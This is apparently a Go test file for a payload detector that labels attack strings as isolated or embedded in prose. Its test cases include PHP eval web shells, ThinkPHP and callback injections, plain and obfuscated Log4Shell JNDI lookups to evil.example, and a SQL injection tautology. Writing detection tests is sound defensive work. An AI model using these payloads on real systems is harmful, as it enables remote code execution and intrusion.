package semantic

import (
	"strings"
	"testing"
)

func TestStripGadgetOnceUnicodeCaseFold(t *testing.T) {
	// ToLower can change byte length (İ → i + combining dot). leftover
	// calculation must not panic.
	got := stripGadgetOnce("İnote ${jndi:ldap://evil.example/a} in logs", `${jndi:ldap://evil.example/a}`)
	if got == "" && classifyPayloadIsolation("İnote ${jndi:ldap://evil.example/a} in logs") == "" {
		t.Fatal("expected leftover or isolation result")
	}
}

func TestClassifyPayloadIsolation(t *testing.T) {
	cases := []struct {
		name, text, want string
	}{
		{"php-file", `<?php eval($_POST['cmd']); ?>`, isolationIsolated},
		{"php-prefixed-shell", "## Description\n\n" + strings.Repeat("x", 80) + "\n<?php eval($_POST['x']); ?>", isolationIsolated},
		{"eval-get", `@eval($_GET[_]);`, isolationIsolated},
		{"thinkphp", `/{${eval($_POST[u])}}`, isolationIsolated},
		{"callback", `$_GET[a]($_GET[b])`, isolationIsolated},
		{"header-eval", `eval(end(getallheaders()))`, isolationIsolated},
		{"jndi-only", `${jndi:ldap://evil.example/a}`, isolationIsolated},
		{"jndi-obfuscated", `${${::-j}ndi:ldap://evil.example/a}`, isolationIsolated},
		{"sql-or", `' or 1=1--`, isolationIsolated},
		{"prose-eval", `Researchers documented eval($_GET['cmd']) in a writeup.`, isolationEmbedded},
		{"prose-jndi", `note ${jndi:ldap://evil.example/a} in logs`, isolationEmbedded},
		{"empty", ``, isolationUnknown},
		{"plain", `hello world`, isolationUnknown},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := classifyPayloadIsolation(tc.text)
			if got != tc.want {
				t.Fatalf("classify %q: want %q got %q", tc.text, tc.want, got)
			}
		})
	}
}
